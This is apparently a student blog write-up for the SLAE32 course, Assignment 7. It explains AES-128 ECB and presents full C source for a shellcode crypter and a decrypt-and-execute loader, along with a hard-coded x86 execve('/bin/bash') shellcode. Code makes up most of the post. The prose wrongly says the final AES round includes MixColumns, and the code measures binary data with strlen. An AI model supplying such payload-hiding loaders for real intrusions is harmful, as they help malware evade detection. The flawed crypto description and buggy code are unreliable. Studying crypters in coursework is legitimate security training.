---
layout: post
title:  "SLAE32"
subtitle: "|  Assignment 7 - Crypter"
date:   2022-10-05 08:45:58 +0200
category: SLAE32
subject: Assignment 7 - Crypter
excerpt_separator: <!--more-->
github-link: https://github.com/jeremycatelain/SLAE32-Assignments/tree/main/assignment7
---

###  <span style="color:#2d8fb3;"> Description of the assignment </span>

- Create a custom crypter like the one shown in the "crypters" video
- Free to use any existing encryption schema
- Can use any programmming language
 
<!--more-->

###  <span style="color:#2d8fb3;"> AES 128 ECB </span>

For this assessment, I decided to use the AES128 encryption algorithm in the ECB mode from the OpenSSL library.

For reminder, the AES (Advanced Encyrption Standard) is a variation of the Rjindael encryption algorithm with fixed block size of of 128 bits, and with a key size of 128, 192 or 256 bits.
The key size defined the number of transformation rounds that will convert your plaintext data into the ciphertext. 

As follows the number of rounds per key size:
- 10 rounds for 128-bit keys.
- 12 rounds for 192-bit keys.
- 14 rounds for 256-bit keys.
 
The AES encryption algorithm is composed of the following steps (if a 128 cipher key is used):
1. Key Scheduling / Key Expension - Define the round keys derived from the cipher key using the AES Key Scheduling. 
2. Initial round key addition (AddRoundKey) - The state (128 bits block of plaintext that we want to encrypt) is combined with a byte of the round key (cipher key) using bitwise xor.
3. Then the following steps are performed 9 times:
  - SubBytes - Substitution step
  - ShiftRows - Transposition step 
  - MixColumns - Linear mixing operation
  - AddRoundKey - Xoring step
4. Final Round:
  - SubBytes - Substitution step
  - ShiftRows - Transposition step 
  - MixColumns - Linear mixing operation

<img src="/assets/slae32-img/assignment7/algo.PNG" alt="drawing" style="width:900px;"/>

For more information you can check the following sources: 
- <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" style="color:#2d8fb3;">en.wikipedia.org</a>
- <a href="https://www.youtube.com/watch?v=O4xNJsjtN6E&t=473s" style="color:#2d8fb3;">Computerphile</a>
- <a href="https://www.youtube.com/watch?v=pSCoquEJsIo" style="color:#2d8fb3;">Hafnium - Sécurité informatique (French)</a>

Then, as I mentionned previously, I used the ECB encryption mode, which basically repeat the encryption operation described previously on every 128 bits of the payload that we want to encrypt.

<img src="/assets/slae32-img/assignment7/modeecb.PNG" alt="drawing" style="width:900px;"/>

For more information you can check the following source: 
- <a href="https://www.highgo.ca/2019/08/08/the-difference-in-five-modes-in-the-aes-encryption-algorithm/" style="color:#2d8fb3;">AES modes - www.highgo.ca</a>




###  <span style="color:#2d8fb3;"> Explanation of the work </span>

So, as i mentionned previously, I used the AES128 encryption algorithm from the OpenSSL library which is composed of several functions.

The first one to use if the ***AES_set_encrypt_key()*** which corresponds to the AES Key Scheduling / Key Expension activity.

    AES_set_encrypt_key(encryption_key, 128, &enc_key);  

Then, we have to perform the encryption of the payload with the ***AES_encrypt()*** function.

    while(c1 < shellcode_len){
    	AES_encrypt(shellcode + c1, enc_out + c1, &enc_key); 
		c1 += 16;
	}

In the first, to ensure that the encryption and the decryption went well.
To do so, I used the ***AES_set_decrypt_key()*** function which does the same as the ***AES_set_encrypt_key()*** function. the  I decrypted as well the shellcode by using 

    AES_set_decrypt_key(encryption_key, 128, &dec_key);

And finally, I used the ***AES_decrypt()*** function which _decrypt 128 bits by 128 bits our encrypted shellcode.

    while(c2 < enc_out_len){
    	AES_decrypt(enc_out + c2, dec_out + c2, &dec_key);
    	c2 += 16;
	}

To perform this assessment, is wrote tow codes, a first one which take as input the encryption key that will be used to encrypt the shellcode.

<img src="/assets/slae32-img/assignment7/execution.PNG" alt="drawing" style="width:900px;"/>

And another one, which decrypt the encrypted shellcode by providing the encryption key and execute it at the same time.

<img src="/assets/slae32-img/assignment7/execution2.PNG" alt="drawing" style="width:900px;"/>

Link to the OpenBSD manual:
- https://man.openbsd.org/AES_encrypt.3

You can find as follows respectively the source code to encrypt a simple shellcode and the source code to decrypt and execute the shellcode. 

**Source code AES Crypter:**

    /*

        Author : Jeremy Catelain
        Filename : aes-cryptor.c

    */

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <openssl/aes.h>

    // GLOBAL VARIABLES
    unsigned char shellcode[] = \
    "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // to modify 

    AES_KEY enc_key, dec_key;
    // Initialisation tables for the encrypted and decrypted payloads
    unsigned char enc_out[100];
    unsigned char dec_out[100];

    // Shellcode printer
    void print_shellcode(unsigned char shellc[]) {
        int len = strlen(shellc);
        for (int i = 0; i < len; i++) {
            printf("\\x%02x", shellc[i]);
        }
    }

    // Encryption 
    void encryption(unsigned char *encryption_key, int shellcode_len){

	    AES_set_encrypt_key(encryption_key, 128, &enc_key); // AES key scheduling - Expand the Userkey, which is bits long into the key structure to preprare for encryption.

        // The encryption is performed 16 bytes by 16 bytes
	    long c1 = 0;
        while(c1 < shellcode_len){
    	    AES_encrypt(shellcode + c1, enc_out + c1, &enc_key); 
		    c1 += 16;
	    }
    }

    // Decryption
    void decryption(unsigned char *encryption_key, int enc_out_len){

        AES_set_decrypt_key(encryption_key, 128, &dec_key);

        // Decyption performed 16 bytes by 16 bytes
        long c2 = 0;
        while(c2 < enc_out_len){
    	    AES_decrypt(enc_out + c2, dec_out + c2, &dec_key);
    	    c2 += 16;
	    }
    }

    int aes_workflow(unsigned char *encryption_key) {

        int shellcode_len = strlen(shellcode);
	
	    //Encryption of the payload
        encryption(encryption_key, shellcode_len);

        // Length of the encrypted payload
        int enc_out_len = strlen((unsigned char *)enc_out);

        //Decryption of the payload
        decryption(encryption_key, enc_out_len);

        // Length of the decrypted payload
	    int dec_out_len = strlen((unsigned char *)dec_out);

	    if (shellcode_len != dec_out_len){
		    printf("ATTENTION: Length of the Encryption key too small.\n");
	    }

	    printf("Original:\t");
        print_shellcode(shellcode);
        printf("\nEncrypted:\t");
        print_shellcode(enc_out);
        printf("\nDecrypted:\t");
        print_shellcode(dec_out);

    }

    int main(int argc, char* argv[])
    {
	    unsigned char *encryption_key;
	    int encryption_key_length;
	    encryption_key = (unsigned char *)argv[1];
	    encryption_key_length = strlen((unsigned char *)encryption_key);
	    printf("Encryption started...\n");

	    printf("The Encryption key length : %d\n", encryption_key_length);
	    // Verification that the key length is 16 bytes
	    if (encryption_key_length > 16){
		    printf ("ATTENTION: Only the first 16 bytes of the Encryption key will be taken: \"");
		    for (int i=0; i<16; i++){
			    printf("%c",*(encryption_key+i));
		    }
		    printf("\"\n");
	    }
	    aes_workflow(encryption_key);
	    return 0;
    }
    

**Source code AES Decrypter:**

    /*

        Author : Jeremy Catelain
        Filename : aes-cryptor.c

    */

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <openssl/aes.h>

    // GLOBAL VARIABLES
    unsigned char encrypted_shellcode[] = \
    "\xc3\xf8\x41\x52\xf0\xfc\x42\x13\xb1\x76\x52\x62\xaa\x98\x92\x3e\x99\x74\x26\x4b\x06\x48\x2d\xd7\x56\x33\x96\xc7\xc8\x24\x7a\x6e"; // to modify 

    AES_KEY dec_key;
    // Initialisation table for the shellcode
    unsigned char shellcode[100];

    // Shellcode printer
    void print_shellcode(unsigned char shellc[]) {
        int len = strlen(shellc);
        for (int i = 0; i < len; i++) {
            printf("\\x%02x", shellc[i]);
        }
    }

    // Decryption
    void decryption(unsigned char *decryption_key, int encrypted_shellcode_len){

        AES_set_decrypt_key(decryption_key, 128, &dec_key);

        // Decyption performed 16 bytes by 16 bytes
        long c = 0;
        while(c < encrypted_shellcode_len){
            AES_decrypt(encrypted_shellcode + c, shellcode + c, &dec_key);
            c += 16;
        }
    }

    int main(int argc, char* argv[])
    {
    
        unsigned char* decryption_key = (unsigned char *)argv[1];
    
        printf("Decryption started...\n");

        int encrypted_shellcode_len = strlen((unsigned char *)encrypted_shellcode);
        printf("Shellcode Length: %d\n", encrypted_shellcode_len);

        decryption(decryption_key, encrypted_shellcode_len);

        int (*ret)() = (int(*)())shellcode;

        ret();

    }
    
